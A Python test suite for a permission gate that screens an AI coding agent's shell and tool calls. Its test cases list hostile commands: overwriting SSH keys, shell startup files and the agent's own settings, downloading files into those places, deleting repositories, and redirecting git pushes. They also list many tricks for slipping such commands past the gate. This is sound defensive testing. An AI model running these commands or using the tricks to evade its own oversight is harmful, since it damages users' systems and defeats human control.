"""The second review of #43, the last patch round: every example as a test.

After this round the gate is documented as what D40 says it is: a seatbelt
against mistakes, rules over text, not a wall against a misled agent. The
numbers are the review's.
"""
import dataclasses
import json
import os
import subprocess
import sys
import uuid

import pytest

from agent_host import classify, config as config_mod, decision, shell
from tests.gatekit import REPO_ROOT, bash, git_init, make_config, make_ctx, run_git, run_hook

M = "me/demo"


@pytest.fixture
def ctx(tmp_path):
    (tmp_path / "home").mkdir(exist_ok=True)
    ctx = make_ctx(tmp_path)
    (tmp_path / "home" / ".ssh").mkdir(exist_ok=True)
    return ctx


def _self(ctx, command):
    verdict = bash(command, ctx)
    assert verdict.gated and verdict.classes == ("self",), (command, verdict)


def _refused(ctx, command):
    verdict = bash(command, ctx)
    assert verdict.gated, (command, verdict)
    return verdict


# --- 1: the gate's own protection -----------------------------------------------------------

@pytest.mark.parametrize("command", [
    # Protected paths, with quotes anywhere in them.
    'echo x >> ~/.claude/"settings.json"',
    "cp evil ~/.claude/'settings.json'",
    'cp evil "$HOME"/.bashrc',
    'cp evil "${HOME}/.claude"/CLAUDE.md',
    "tee ~/.ssh/'authorized'_keys",
    'sed -i s/a/b/ ~/".bashrc"',
    "cp evil .claude/settings'.local'.json",
    'python3 x.py ~/.cl"aude"/settings.json',
])
def test_1_a_protected_path_is_found_through_its_quotes(ctx, command):
    _self(ctx, command)


@pytest.mark.parametrize("command", [
    # A write whose destination directory is a protected place, whatever the program.
    "cp evil.json ~/.claude/",
    "cp evil.json ~/.claude",
    "cp -t ~/.ssh evil",
    "cp evil ~",
    "cp evil ~/",
    "install -m 600 evil ~/.ssh/",
    "mv evil ~/.claude/",
    "tar -C ~ -xf evil.tar",
    "tar -xf evil.tar -C ~/.claude",
    "tar xf evil.tar --directory=$HOME",
    "unzip evil.zip -d ~/.claude",
    "curl -o ~/.claude/settings.json https://example.invalid/x",
    "curl -O --output-dir ~/.claude https://example.invalid/settings.json",
    "curl --output-dir=$HOME -O https://example.invalid/.bashrc",
    "wget -O ~/.bashrc https://example.invalid/x",
    "wget -P ~/.ssh https://example.invalid/authorized_keys",
    "wget --directory-prefix=~/.claude https://example.invalid/settings.json",
    "rsync -a evil/ ~/.claude/",
    "rsync -a evil/ ~/",
    "git checkout other -- .claude",
    "git checkout other -- .claude/",
    "git restore --source=other .claude/",
    "git restore -s other -- .claude/settings.json",
    "tee ~/.claude/hooks/x.sh",
    "dd if=evil of=~/.ssh/authorized_keys",
    "cp evil ~/.claude/hooks/",
    "cp evil ~/.claude/agents/",
    "cp evil ~/.claude/skills/x/",
    "cp evil ~/.claude/plugins/",
    "cp -r evil .claude/",
    "ln -s /tmp/evil .claude",
    # A file whose directory is a protected place lands there, known name or not.
    "cp a.txt ~/notes.txt",
    "cp evil ~/.gitconfig",
    "cp evil ~/.claude/keybindings.json",
    "cp evil ~/.claude/settings.json.bak",
    "curl -o ~/.npmrc https://example.invalid/x",
    "git checkout other -- .claude/commands.md",
    "mv evil ~/.ssh/config",
])
def test_1_a_write_into_a_protected_directory_is_self_whatever_the_program(ctx, command):
    _self(ctx, command)


@pytest.mark.parametrize("command", [
    "curl -O https://example.invalid/.bashrc",
    "wget https://example.invalid/authorized_keys",
    "git apply evil.patch",
    "tar xf evil.tar",
    "unzip evil.zip",
    "make install",
    "cp /tmp/evil settings.json",
])
def test_1_a_write_program_run_from_a_protected_directory_is_self(tmp_path, command):
    make_ctx(tmp_path)
    home = tmp_path / "home"
    (home / ".ssh").mkdir(exist_ok=True)
    for cwd in (home, home / ".claude", home / ".ssh"):
        ctx = make_ctx(tmp_path, cwd=cwd)
        _self(ctx, command)
    # ... and a reader there is still a reader.
    for command in ("ls -la", "cat settings.json", "grep -n hooks settings.json"):
        assert not bash(command, make_ctx(tmp_path, cwd=home / ".claude")).gated


def test_1_after_cd_into_a_protected_directory_it_is_self_too(ctx, tmp_path):
    for command in ("cd ~ && curl -O https://example.invalid/.bashrc",
                    "cd ~/.claude && git apply evil.patch", "cd ~/.ssh && wget https://x.example/k"):
        _self(ctx, command)


def test_1_reading_and_writing_elsewhere_is_still_not_self(ctx, tmp_path):
    for command in ("ls ~", "ls -la ~/.claude", "cat ~/.claude/settings.json", "du -sh ~/.ssh",
                    "mkdir -p ~/projects/x", "cp evil src/",
                    "tar -C build -xf x.tar", "curl -o out.html https://example.invalid/x",
                    "wget -P downloads https://example.invalid/x", "git checkout other -- src"):
        assert not bash(command, ctx).gated, command
    # A checkout that lives in the home directory is a place of its own, not the home directory.
    (tmp_path / "home" / "jarvis").mkdir()
    for command in ("make -C ~/jarvis test", "cp a.txt ~/jarvis", "pytest ~/jarvis/tests"):
        assert not bash(command, ctx).gated, command


@pytest.mark.parametrize("command", [
    # `~user`, a brace expansion or a variable in an argument of something that is no reader.
    "cp evil ~root/.bashrc",
    "cp evil ~other/.claude/settings.json",
    "cp evil {~,/tmp}/.bashrc",
    "cp evil ~/.{bashrc,profile}",
    "cp evil $D/.bashrc",
    "cp evil ${D}/settings.json",
    'cp evil "$D"/settings.json',
    "tee $TARGET",
    "tar -C $D -xf evil.tar",
    "rm -rf $D",
    "mv evil $PWD/../.bashrc",
    "touch file{1..3}",
    "kubectl delete pod $POD",
    f"gh pr merge $N --repo {M}",
])
def test_1_a_path_the_shell_still_expands_is_refused(ctx, command):
    verdict = _refused(ctx, command)
    assert verdict.run_alone or verdict.classes == ("self",)


def test_1_what_is_not_an_expansion(ctx):
    for command in ("git commit -m 'costs $5 and ${x} literally'", "grep '$HOME' notes.txt",
                    "cat $FILE", "ls ~other", "make 'A={b,c}'", "pytest -k 'a{b}'",
                    "git commit -m \"it costs $5\"", "cp a.txt b.txt"):
        assert not bash(command, ctx).gated, command
    assert shell.has_expansion("cp a $X") and shell.has_expansion('cp a "$X"')
    assert not shell.has_expansion("cp a '$X'") and not shell.has_expansion("cp a \\$X")
    assert shell.has_expansion("cp a ~bob/x") and not shell.has_expansion("cp a ~/x")
    assert shell.has_expansion("cp a{1,2} b") and shell.has_expansion("touch f{1..3}")
    assert not shell.has_expansion("cp 'a{1,2}' b") and not shell.has_expansion("echo {} {a}")


# --- 2: program-word tricks -------------------------------------------------------------------

@pytest.mark.parametrize("command", [
    "/usr/bin/g? repo delete me/demo",
    "g[h] repo delete me/demo",
    "/bin/r* -rf /srv",
    "kubect? delete pod web",
    "sudo /usr/bin/g? repo delete me/demo",
    ">cat gh repo delete me/demo",
    ">cat rm -rf /srv",
    "2>x rm -rf /srv",
    "<in rm -rf /srv",
    "ls; >cat rm -rf /srv",
    "true && >cat rm -rf /srv",
    "ls | >cat rm -rf /srv",
])
def test_2_a_pattern_or_a_redirection_where_the_program_should_be_is_refused(ctx, command):
    assert _refused(ctx, command).run_alone


@pytest.mark.parametrize("command", [
    "git commit -F - <<<'EOF'\nrm -rf /srv\nEOF",
    "cat <<<EOF\nmake install\nEOF",
    "bash <<< 'make install'",
    # The here-document ends at the FIRST delimiter line; what follows is a command.
    "git commit -m \"$(cat <<'EOF'\nfix\nEOF\nrm -rf /srv\nEOF\n)\"",
    "git commit -m \"$(cat <<'EOF'\nfix\nEOF\nEOF\n)\"",
    "git commit -F - <<'EOF'\nfix\nEOF\nmake install\nEOF",
])
def test_2_a_here_string_is_no_here_document_and_the_first_delimiter_ends_it(ctx, command):
    _refused(ctx, command)


# --- 3: shell and interpreter reach --------------------------------------------------------------

@pytest.mark.parametrize("command,classes", [
    ("bash -c -- 'gh repo delete me/demo'", ["delete"]),
    ("bash -c -x 'gh repo delete me/demo'", ["delete"]),
    ("bash -c -e -u 'gh repo delete me/demo'", ["delete"]),
    ("bash -x -c -e 'gh repo delete me/demo'", ["delete"]),
    ("sh -c -- 'kubectl delete pod web'", ["delete"]),
    ("bash -c -o pipefail 'gh repo delete me/demo'", ["delete"]),
    ("bash -ec -- 'gh repo delete me/demo' arg0", ["delete"]),
])
def test_3_the_command_string_of_dash_c_is_the_first_non_option_argument(ctx, command, classes):
    assert _refused(ctx, command).classes == tuple(classes)


@pytest.mark.parametrize("command", [
    "awk 'BEGIN { system(\"gh repo delete x\") }'",
    "awk '{ print | \"sh\" }' file",
    "awk '{ \"date\" | getline d }' file",
    "awk '{ print > \"/srv/out\" }' file",
    "gawk 'BEGIN{system(\"x\")}'",
    "awk -f script.awk file",
    "sed '1e gh repo delete x' file",
    "sed 'e' file",
    "sed 's/a/gh repo delete x/e' file",
    "sed -n 'w /srv/out' file",
    "sed 's/a/b/w /srv/out' file",
    "sed -f script.sed file",
    "rg --pre ./evil.sh pattern",
    "rg --pre=./evil.sh pattern",
    "sort --compress-program=./evil.sh big.txt",
    # The script given as an option value is a script too.
    "sed --expression='1e id' f",
    "sed --expr='1e id' f",
    "sed -e'1e id' f",
    "sed -ne '1e id' f",
    "sed -sne'1e id' f",
    "sed -n -e 's/a/b/w /tmp/o' f",
    "sed --file=x.sed f",
    "awk --source='BEGIN{system(\"x\")}'",
    "awk -e'BEGIN{system(\"x\")}'",
    "awk --exec=evil.awk f",
    "awk -fevil.awk f",
])
def test_3_a_script_that_reaches_out_is_inline_code_desk_only(ctx, command):
    verdict = _refused(ctx, command)
    assert verdict.classes == ()
    assert verdict.rule.startswith("interpreter:")


def test_3_plain_awk_sed_and_rg_still_run(ctx):
    for command in ("awk '{print $1}' file", "awk -F, '{s+=$2} END {print s}' data.csv",
                    "sed -n 1,5p file", "sed 's/one/two/g' file", "sed -e 's/a/b/' -e 's/c/d/' f",
                    "sed -E 's/(a|b)/c/g' f", "sed -i.bak s/a/b/ f", "awk -F'|' '{print $1}' f",
                    "awk -vx=1 '{print x}' f",
                    "rg -n pattern src", "sort -u names.txt"):
        assert not bash(command, ctx).gated, command
    assert bash("sed -i s/a/b/ ~/.bashrc", ctx).classes == ("self",)
    assert bash("ls | rg --pre ./evil.sh x", ctx).gated


@pytest.mark.parametrize("command", [
    "mystery python3 -c 'print(1)'",
    "runner bash script.sh",
    "retry 3 node -e x",
    "wrap awk 'BEGIN{system(\"x\")}'",
    "wrap perl -e x",
    "A+=x gh repo delete me/demo",
    "A[0]=x gh repo delete me/demo",
    "PATH+=:/tmp/evil ls",
    "arr[1]=y make",
])
def test_3_an_unknown_wrapper_before_an_interpreter_and_odd_assignments_refuse(ctx, command):
    assert _refused(ctx, command).run_alone


# --- 4: gh flags before the subcommand ----------------------------------------------------------

@pytest.mark.parametrize("command", [
    "gh --method=DELETE api repos/me/demo",
    "gh --method DELETE api repos/me/demo",
    "gh -X DELETE api repos/me/demo",
    "gh --input=body.json api repos/me/demo/issues",
    "gh --field=title=x api repos/me/demo/issues",
    "gh -f title=x api repos/me/demo/issues",
    "gh --raw-field=title=x api repos/me/demo/issues",
])
def test_4_an_api_write_is_gated_wherever_its_flags_stand(ctx, command):
    _refused(ctx, command)


# --- 5: git ---------------------------------------------------------------------------------------

@pytest.mark.parametrize("command", [
    "git config remote.origin.pushurl git@elsewhere.example:x/y.git",
    "git config --global alias.st push",
    "git config core.hooksPath /tmp/hooks",
    "git config --add remote.origin.push refs/heads/x:refs/heads/main",
    "git config --unset remote.origin.pushurl",
    "git config --replace-all user.name x",
    "git config -e",
    "git config set user.name x",
    "git config --file .gitmodules submodule.x.url y",
    "git -C /srv/repo config core.sshCommand evil",
])
def test_5_a_git_config_write_is_gated_and_has_no_sentence(ctx, command):
    verdict = _refused(ctx, command)
    assert verdict.classes == ()


def test_5_a_git_config_read_still_runs(ctx):
    for command in ("git config --get user.name", "git config --list", "git config -l",
                    "git config user.name", "git config --get-all remote.origin.push",
                    "git config get user.name", "git config list", "git config --get-regexp '^alias'"):
        assert not bash(command, ctx).gated, command


@pytest.mark.parametrize("command", [
    "GIT_CONFIG_PARAMETERS=\"'alias.st=push'\" git st origin main",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.sshCommand GIT_CONFIG_VALUE_0=evil git fetch",
    "env GIT_CONFIG_COUNT=1 git status",
    "GIT_CONFIG_GLOBAL=/tmp/evil git push origin feature",
])
def test_5_git_configuration_through_the_environment_refuses(ctx, command):
    _refused(ctx, command)


@pytest.mark.parametrize("command,classes", [
    ("git-push origin main", ["merge"]),
    ("git-push -f origin feature", ["force"]),
    ("/usr/lib/git-core/git-push origin main", ["merge"]),
    ("/usr/lib/git-core/git push origin main", ["merge"]),
    ("git send-pack origin main", []),
    ("git receive-pack /srv/repo.git", []),
    ("git-send-pack origin main", []),
    ("git http-push https://example.invalid/x main", []),
])
def test_5_a_push_by_another_name_is_a_push(ctx, command, classes):
    assert _refused(ctx, command).classes == tuple(classes)


def test_5_a_subcommand_that_is_an_alias_in_this_repository_refuses(tmp_path):
    work = tmp_path / "work"
    git_init(work)
    run_git(work, "config", "alias.st", "push origin HEAD:main")
    run_git(work, "config", "alias.l", "log --oneline")
    ctx = make_ctx(tmp_path, cwd=work, git=classify.run_git)
    assert bash("git st", ctx).run_alone
    assert bash("git l", ctx).run_alone                 # which alias it is, is not weighed
    assert bash(f"git -C {work} st", make_ctx(tmp_path, git=classify.run_git)).run_alone
    assert not bash("git status", ctx).gated
    assert not bash("git log --oneline", ctx).gated


def test_5_a_push_without_src_dst_is_gated_when_configuration_maps_it(tmp_path):
    work = tmp_path / "work"
    git_init(work, branch="feature")
    run_git(work, "remote", "add", "origin", "git@github.com:me/jarvis.git")
    ctx = make_ctx(tmp_path, cwd=work, git=classify.run_git)
    assert not bash("git push origin feature", ctx).gated
    run_git(work, "config", "remote.origin.push", "refs/heads/feature:refs/heads/main")
    assert bash("git push origin feature", ctx).gated            # it would land on main
    assert bash("git push -u origin feature", ctx).gated
    assert not bash("git push origin feature:feature", ctx).gated  # an explicit src:dst is itself
    run_git(work, "config", "--unset", "remote.origin.push")
    run_git(work, "config", "push.default", "upstream")
    assert bash("git push origin feature", ctx).gated
    run_git(work, "config", "push.default", "simple")
    assert not bash("git push origin feature", ctx).gated


# --- 6, 7, 8: find, curl, rsync ---------------------------------------------------------------------

def test_6_find_options_before_the_start_paths(tmp_path):
    work = tmp_path / "area" / "work"
    git_init(work)
    ctx = make_ctx(tmp_path, cwd=work)
    for command in ("find -L .. -delete", "find -H -L /srv -name x -delete", "find -P ../.. -delete",
                    "find -D tree .. -delete", "find -O3 .. -delete", "find -L -O2 -D stat /srv -delete",
                    "find -- .. -delete", "find -L -- /srv -delete"):
        verdict = bash(command, ctx)
        assert verdict.gated and verdict.classes in (("delete",), ("self",)), (command, verdict)
    for command in ("find -L . -name '*.pyc' -delete", "find -O2 . -type f", "find -H . -delete",
                    "find -- . -delete"):
        assert not bash(command, ctx).gated, command
    assert bash("find -L . -exec rm {} +", ctx).run_alone


@pytest.mark.parametrize("command", [
    "curl --expand-data '{{x}}' https://example.invalid/",
    "curl --expand-data=x https://example.invalid/",
    "curl --expand-json x https://example.invalid/",
    "curl --expand-form a=b https://example.invalid/",
    "curl --expand-upload-file x https://example.invalid/",
    "curl --expand-request DELETE https://example.invalid/",
    "curl --expand-config /tmp/c https://example.invalid/",
])
def test_7_curl_expand_options_are_the_options_they_expand(ctx, command):
    assert _refused(ctx, command).classes == ("api",)


def test_7_a_plain_expand_url_is_still_a_read(ctx):
    assert not bash("curl --expand-url https://example.invalid/{{x}}", ctx).gated


def test_8_rsync_delete_is_a_recursive_delete_of_its_destination(tmp_path):
    work = tmp_path / "area" / "work"
    git_init(work)
    (work / "build").mkdir()
    ctx = make_ctx(tmp_path, cwd=work)
    for command in ("rsync -a --delete src/ ../other/", "rsync -a --delete-before src/ /srv/x/",
                    "rsync -a --del src/ ../x", "rsync -a --delete-excluded src/ ../x",
                    "rsync -a --remove-source-files ../x/ build/"):
        verdict = bash(command, ctx)
        assert verdict.gated and verdict.classes == ("delete",), (command, verdict)
    assert not bash("rsync -a --delete src/ build/", ctx).gated
    assert not bash("rsync -a src/ ../other/", ctx).gated
    assert bash("rsync -a --delete src/ web:/srv/", ctx).classes == ("outward", "delete")
    assert bash("rsync -a --delete evil/ ~/.claude/", ctx).classes == ("self",)


# --- 9: where the gate reads its configuration ---------------------------------------------------------

def test_9_installed_the_gate_reads_one_fixed_path_and_ignores_the_environment(tmp_path):
    installed = tmp_path / "usr" / "agent_host"
    installed.mkdir(parents=True)
    planted = tmp_path / "planted.toml"
    environ = {"JARVIS_AGENT_CONFIG": str(planted)}
    assert config_mod.hook_config_path(environ, installed) == config_mod.DEFAULT_CONFIG_PATH
    assert str(config_mod.DEFAULT_CONFIG_PATH) == "/etc/jarvis-agent/config.toml"
    # The switch is the test kit lying next to the package: a source checkout.
    assert config_mod.hook_config_path(environ, REPO_ROOT / "agent_host") == planted
    assert config_mod.hook_config_path({}, REPO_ROOT / "agent_host") == config_mod.DEFAULT_CONFIG_PATH
    with pytest.raises(config_mod.ConfigError):
        config_mod.hook_config_path({"JARVIS_AGENT_CONFIG": "relative.toml"}, REPO_ROOT / "agent_host")


def test_9_an_installed_copy_of_the_gate_does_not_follow_a_planted_configuration(tmp_path):
    """A copy of the package without the tests next to it, as the installer
    makes it: `JARVIS_AGENT_CONFIG` points at a configuration with
    confirmation off and everything allowed, and the gate does not read it."""
    import shutil
    src = tmp_path / "installed" / "src"
    shutil.copytree(REPO_ROOT / "agent_host", src / "agent_host",
                    ignore=shutil.ignore_patterns("__pycache__"))
    (src / "bridge").mkdir()
    for name in ("__init__.py", "summary.py"):
        shutil.copy(REPO_ROOT / "bridge" / name, src / "bridge" / name)
    config = make_config(tmp_path)
    planted = tmp_path / "planted.toml"
    planted.write_text(
        f'projects_root = "{tmp_path / "projects"}"\nstate_dir = "{tmp_path / "state"}"\n'
        f'environment_file = "{config.environment_file}"\nturn_settings = "{config.turn_settings_path}"\n'
        f'prompt_file = "{config.prompt_path}"\nsession_identity = "jarvis"\n'
        f'user_settings_path = "{config.user_settings_path}"\nrules_dir = "{tmp_path / "none"}"\n')
    checkout = tmp_path / "projects" / "demo"
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}, "cwd": str(checkout)})
    env = {"JARVIS_TURN": "1", "JARVIS_TURN_ID": str(uuid.uuid4()),
           "JARVIS_AGENT_CONFIG": str(planted), "JARVIS_TURN_CHECKOUT": str(checkout),
           "PATH": os.environ.get("PATH", "")}
    gate_dir = tmp_path / "state" / "gate"
    installed = run_hook([sys.executable, "-I", src / "agent_host" / "gate"], payload.encode(), env,
                         gate_dir=gate_dir)
    source = run_hook([sys.executable, REPO_ROOT / "agent_host" / "gate"], payload.encode(), env,
                      gate_dir=gate_dir)
    # From the source checkout the planted file is read, and `ls` passes ...
    assert (source.returncode, source.stdout) == (0, b"")
    # ... the installed copy looks at /etc/jarvis-agent/config.toml only.
    if not config_mod.DEFAULT_CONFIG_PATH.exists():
        out = json.loads(installed.stdout)["hookSpecificOutput"]
        assert out["permissionDecision"] == "deny"


def test_9_the_rules_directory_comes_from_that_configuration_only(tmp_path, monkeypatch):
    config = make_config(tmp_path)
    monkeypatch.setenv("JARVIS_RULES_DIR", str(tmp_path / "evil.d"))
    monkeypatch.setenv("HOME", str(tmp_path / "decoy"))
    for module in ("rules.py", "decision.py", "classify.py"):
        assert "os.environ" not in (REPO_ROOT / "agent_host" / module).read_text()
    assert config.rules_dir == tmp_path / "etc" / "rules.d"


# --- 10: connector tools ---------------------------------------------------------------------------------

@pytest.mark.parametrize("tool", [
    "mcp__github__merge_pull_request", "mcp__github__push_files",
    "mcp__github__create_or_update_file", "mcp__github__create_pull_request",
    "mcp__github__create_issue", "mcp__github__update_issue", "mcp__github__fork_repository",
    "mcp__x__write_file", "mcp__x__transfer_repo", "mcp__x__approve_review",
    "mcp__x__dismiss_review", "mcp__x__close_issue", "mcp__x__reopen_issue",
    "mcp__x__invite_user", "mcp__x__assign_issue",
])
def test_10_a_connector_tool_that_changes_a_forge_is_gated(ctx, tool):
    assert classify.classify(tool, {"x": 1}, ctx).gated


@pytest.mark.parametrize("tool", [
    "mcp__github__get_pull_request", "mcp__github__list_issues", "mcp__github__search_code",
    "mcp__x__read_file", "mcp__docs__query",
])
def test_10_a_connector_tool_that_reads_is_not(ctx, tool):
    assert not classify.classify(tool, {"x": 1}, ctx).gated


# --- 11: the settings check --------------------------------------------------------------------------------

def test_11_a_claude_directory_that_is_a_symlink_is_unsafe(tmp_path):
    from agent_host import checkout_settings
    checkout = tmp_path / "demo"
    (checkout / ".git").mkdir(parents=True)
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (checkout / ".claude").symlink_to(elsewhere)
    assert checkout_settings.problem(checkout) == ".claude is a symlink"


def test_11_the_pre_turn_settings_check_runs_inside_the_turn_lock(tmp_path, monkeypatch):
    """Another turn that is still running in the checkout could bring a
    settings file between a check made outside the lock and the start."""
    from agent_host import wrapper
    from agent_host.turnlock import acquire_turn_lock
    from tests.test_agent_host_wrapper import _config, _raw
    config = _config(tmp_path)
    target = tmp_path / "projects" / "demo" / ".claude" / "settings.json"
    target.parent.mkdir(parents=True)
    target.write_text('{"hooks": {}}')
    # While the lock is held the answer is `busy`: nothing was decided about the settings yet.
    with acquire_turn_lock(config.lock_path):
        assert wrapper.handle_request(_raw(), config)["error"] == "busy"
    seen = []
    real = wrapper._checkout_settings_problem

    def spy(working_dir, cfg):
        # The lock is held by this very request when the check runs.
        try:
            with acquire_turn_lock(config.lock_path):
                seen.append("free")
        except Exception:  # noqa: BLE001
            seen.append("held")
        return real(working_dir, cfg)

    monkeypatch.setattr(wrapper, "_checkout_settings_problem", spy)
    assert wrapper.handle_request(_raw(), config)["error"] == "unsafe_settings"
    assert seen == ["held"]


# --- the verification of the last round (heads 1df3db0 / d7d22d6) ----------------------------------

def _mapped_repo(tmp_path, how):
    """A checkout on feature-x whose configuration sends feature-x to main."""
    work = tmp_path / "area" / "work"
    git_init(work, branch="feature-x")
    run_git(work, "remote", "add", "origin", "git@github.com:me/demo.git")
    if how == "mapping":
        run_git(work, "config", "remote.origin.push", "refs/heads/feature-x:refs/heads/main")
    else:
        run_git(work, "update-ref", "refs/remotes/origin/main", "HEAD")
        run_git(work, "config", "branch.feature-x.remote", "origin")
        run_git(work, "config", "branch.feature-x.merge", "refs/heads/main")
        run_git(work, "config", "push.default", "upstream")
    return work, make_ctx(tmp_path, cwd=work, git=classify.run_git)


@pytest.mark.parametrize("how", ["mapping", "upstream"])
@pytest.mark.parametrize("command", [
    "git push --force origin feature-x",
    "git push --force-with-lease origin feature-x",
    "git push origin +feature-x",
    "git push -f origin HEAD",
    "git push origin feature-x",
])
def test_b1_a_push_the_configuration_maps_elsewhere_is_push_mapped(tmp_path, how, command):
    _, ctx = _mapped_repo(tmp_path, how)
    verdict = bash(command, ctx)
    assert verdict.gated and verdict.rule == "push:mapped", (command, verdict)


def _other_repo(tmp_path):
    """`../other`, whose default branch is develop and which maps feature-x to main."""
    work = tmp_path / "area" / "work"
    git_init(work, branch="feature-x")
    run_git(work, "remote", "add", "origin", "git@github.com:me/demo.git")
    other = tmp_path / "area" / "other"
    git_init(other, branch="develop")
    run_git(other, "remote", "add", "origin", "git@github.com:me/other.git")
    run_git(other, "update-ref", "refs/remotes/origin/develop", "HEAD")
    run_git(other, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/develop")
    run_git(other, "config", "remote.origin.push", "refs/heads/feature-x:refs/heads/main")
    return make_ctx(tmp_path, cwd=work, git=classify.run_git)


@pytest.mark.parametrize("command", [
    "env -C ../other git push origin develop",
    "env -C ../other git push origin feature-x",
    "env --chdir=../other git push origin develop",
    "env --chdir ../other git push origin feature-x:feature-x",
    "GIT_DIR=../other/.git git push origin develop",
    "GIT_WORK_TREE=../other git push origin develop",
    "GIT_COMMON_DIR=../other/.git git push origin develop",
    "env GIT_DIR=../other/.git git push origin feature-x:feature-x",
    "sudo -D ../other git push origin develop",
    "sudo --chdir=../other git push origin develop",
])
def test_b2_a_push_run_for_another_repository_is_push_redirected(tmp_path, command):
    verdict = bash(command, _other_repo(tmp_path))
    assert verdict.gated and "push:redirected" in verdict.rule, (command, verdict)


def test_b2_a_plain_push_from_here_is_still_judged_here(tmp_path):
    ctx = _other_repo(tmp_path)
    assert not bash("git push origin feature-x", ctx).gated
    assert not bash("env -i git push origin feature-x", ctx).gated


@pytest.mark.parametrize("command", [
    "scp notes.txt [fe80::1%eth0]:/srv/",
    "scp notes.txt me@[fe80::1%25eth0]:/srv/",
    "rsync -a dir/ [fe80::1%eth0]:/srv/",
    "scp [fe80::1%eth0]:/srv/x .",
])
def test_a_copy_to_a_host_with_a_zone_id_is_outward(ctx, command):
    verdict = bash(command, ctx)
    assert verdict.gated and "outward" in verdict.classes, (command, verdict)


@pytest.mark.parametrize("command", [
    "tee -a .git/config",
    "echo '[remote \"origin\"]' >> .git/config",
    "printf x > .git/config",
    "cp evil .git/hooks/pre-push",
    "cp evil .git/info/attributes",
    "echo x > ../other/.git/config",
    "cp evil .git/worktrees/w1/config.worktree",
    "cp evil .git/modules/sub/hooks/post-checkout",
    "sed -i s/a/b/ .git/config",
])
def test_a_write_to_a_repositorys_configuration_or_hooks_is_self(ctx, command):
    _self(ctx, command)


@pytest.mark.parametrize("tool", ["Edit", "Write", "MultiEdit"])
@pytest.mark.parametrize("path", [".git/config", ".git/hooks/pre-commit", ".git/info/exclude",
                                  "/srv/repo/.git/config"])
def test_the_write_tools_on_a_repositorys_configuration_are_self(ctx, tool, path):
    verdict = classify.classify(tool, {"file_path": path, "content": "x"}, ctx)
    assert verdict.gated and verdict.classes == ("self",), (tool, path, verdict)


def test_reading_a_repositorys_configuration_and_writing_elsewhere_in_git_is_not_self(ctx):
    for command in ("cat .git/config", "grep -n url .git/config", "ls .git/hooks",
                    "git status", "git commit -m 'edit config docs'"):
        assert not bash(command, ctx).gated, command
    for path in (".git/COMMIT_EDITMSG", "src/config", "docs/hooks/x.md", ".gitconfig.example"):
        assert not classify.classify("Write", {"file_path": path, "content": "x"}, ctx).gated, path


# --- worktrees for another repository (Mark, 2026-11-16) ---------------------------------
# A voice turn's `git -C ~/bazibo worktree add ~/bazibo-piano …` was refused as `self`. That
# stays so (a directory in ~ becomes a project, and only the wrapper sets projects up); the
# prompt sends such worktrees to ~/.worktrees/<name>, which is not a protected place.

@pytest.mark.parametrize("command", [
    "git -C ~/bazibo worktree add ~/.worktrees/jv-bazibo-piano -b feat/piano main",
    "git worktree add ~/.worktrees/jv-bazibo-piano feat/piano",
    "mkdir -p ~/.worktrees/jv-scratch",
])
def test_1_a_worktree_under_dot_worktrees_is_not_self(ctx, command):
    (ctx.home / "bazibo").mkdir()  # an existing checkout, as on the host
    assert "self" not in bash(command, ctx).classes, command


@pytest.mark.parametrize("command", [
    "git -C ~/bazibo worktree add ~/bazibo-piano -b feat/piano main",
    "git clone https://example.invalid/x ~/x",
])
def test_1_a_new_directory_directly_in_home_stays_self(ctx, command):
    (ctx.home / "bazibo").mkdir()
    assert "self" in bash(command, ctx).classes, command
